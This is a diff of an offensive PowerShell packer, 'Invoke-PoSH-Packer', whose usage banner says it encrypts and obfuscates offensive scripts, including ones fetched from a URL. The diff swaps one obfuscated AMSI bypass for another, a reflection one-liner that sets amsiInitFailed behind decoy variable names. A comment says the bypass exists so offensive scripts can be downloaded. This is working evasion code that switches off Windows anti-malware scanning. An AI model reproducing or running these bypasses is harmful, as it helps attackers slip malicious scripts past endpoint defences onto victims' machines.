@@ -20,7 +20,7 @@ Write-Output "
  | _ \___/ __| || |___| _ \___  __| |_____ _ _ 
  |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
  |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|  
-                                             v1.3
+                                             v1.4
 Usage: 
 > Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
 > Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
@@ -34,7 +34,7 @@ Features:
 "
 
 # 'A'M'S'I' bypass to be able to download the offensive PowerShell scripts that we want to encrypt/obfuscate
-[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);
+ForEach($boat in $superaudit) {if ($boat.Name -like "*iutils") {$cap = $boat}};$data = $cap.GetFields('NonPublic,Static');ForEach($europe in $data) {if ($europe.Name -like "*itFailed") {$fire = $europe}};$fire.SetValue($null,$true)
 
 function Invoke-PoSH-Packer {
 
